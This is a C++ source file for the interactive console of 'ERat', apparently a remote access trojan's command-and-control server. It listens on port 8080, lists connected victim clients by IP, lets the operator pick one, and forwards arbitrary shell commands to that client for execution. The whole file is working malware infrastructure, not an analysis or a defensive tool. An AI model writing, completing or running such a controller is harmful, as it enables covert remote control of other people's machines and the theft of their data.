#include "Shell.hpp"

#include <iostream>
#include <string>
#include "String.hpp"

namespace ERat
{
	Shell::Shell() : _server(8080)
	{

	}

	bool	Shell::initialize()
	{
		_map.insert(std::make_pair("cmd", std::bind(&ERat::Shell::executeCommand, this, std::placeholders::_1)));
		_map.insert(std::make_pair("list", std::bind(&ERat::Shell::listClients, this, std::placeholders::_1)));
		_map.insert(std::make_pair("use", std::bind(&ERat::Shell::useClient, this, std::placeholders::_1)));
		_serverThread = std::make_unique<std::thread>(&SocketServer::run, &_server);
		return true;
	}

	void	Shell::run()
	{
		cpp::String	line;

		std::cout << "> ";
		while (std::getline(std::cin, line))
		{
			auto tokens = line.tokenize(" \t");
			if (_map.find(tokens.front()) != _map.end()) {
				_map[tokens.front()](tokens);
			}
			else if (!line.empty()) {
				std::cout << "Command not found." << std::endl;
			}
			if (_usedClient) {
				std::cout << "[" << _usedClient->getIp() << "]> ";
			}
			else {
				std::cout << "> ";
			}
		}
	}

	bool	Shell::executeCommand(std::list<cpp::String> const& args)
	{
		std::string commandLine;
		auto	it = args.begin();

		while (++it != args.end()) {
			commandLine = commandLine + *it + " ";
		}
		if (commandLine.empty()) {
			std::cout << "Missing command args" << std::endl;
		}
		else {
			if (!_usedClient) {
				std::cout << "You must first select a client (list)" << std::endl;
				return false;
			}
			ERat::Message	message(ERat::Message::Cmd);

			message.setBody(commandLine.c_str(), commandLine.size());
			_usedClient->addMessage(message);
		}
		return true;
	}

	bool	Shell::listClients(std::list<cpp::String> const&)
	{
		std::cout << "Connected clients list:" << std::endl;
		auto clients = _server.getClients();
		auto it = clients.begin();
		int i = 0;

		while (it != clients.end()) {
			std::cout << "#" << i << ": " << (*it)->getIp() << std::endl;
			++it;
			++i;
		}
		return true;
	}

	bool	Shell::useClient(std::list<cpp::String> const& args)
	{
		auto	it = args.begin();

		_usedClient.reset();
		++it;
		if (it != args.end()) {
			auto i = std::atoi((*it).c_str());

			if (i < _server.getClients().size()) {
				_usedClient = _server.getClients()[i];
				std::cout << "Use client: " << _usedClient->getIp() << std::endl;
			}
		}
		else {
			std::cout << "Missing socket number" << std::endl;
			return false;
		}
		return true;
	}

	Shell::~Shell() {
		_server.close();
		_serverThread->join();
	}
}

